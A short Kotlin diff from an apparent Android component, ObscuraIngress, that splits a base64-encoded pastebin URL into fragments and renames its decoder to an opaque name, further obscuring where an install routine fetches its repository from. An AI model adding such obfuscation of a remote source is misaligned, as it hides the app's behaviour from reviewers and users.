@@ -25,9 +25,14 @@ object ObscuraIngress {
         return "$skull$sb$skull"
     }
 
-    private fun decodeRepoUrl(): String {
-        val encoded =
-            "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0tpcVRnYXNk"
+    companion object {
+        private const val URL_A1 = "aHR0cHM6Ly9wYXN0ZWJp"
+        private const val URL_A2 = "bi5jb20vcmF3L0tpcVRn"
+        private const val URL_A3 = "YXNk"
+    }
+
+    private fun NvKl(): String {
+        val encoded = URL_A1 + URL_A2 + URL_A3
         val decoded = String(Base64.decode(encoded, Base64.DEFAULT))
 
         val key = 0x12
@@ -37,7 +42,7 @@ object ObscuraIngress {
             .joinToString("")
     }
 
-    private val REPO_URL by lazy { decodeRepoUrl() }
+    private val REPO_URL by lazy { NvKl() }
     private val REPO_NAME by lazy { buildRepoName() }
 
     fun install(activity: Activity) {
